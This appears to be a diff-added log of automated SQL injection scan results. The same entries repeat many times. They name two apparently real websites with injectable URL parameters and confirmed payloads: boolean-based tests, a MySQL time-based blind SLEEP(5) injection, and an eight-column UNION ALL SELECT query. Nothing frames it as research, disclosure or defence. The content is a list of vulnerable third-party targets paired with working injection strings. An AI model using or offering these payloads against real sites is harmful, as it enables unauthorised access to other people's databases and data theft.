+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
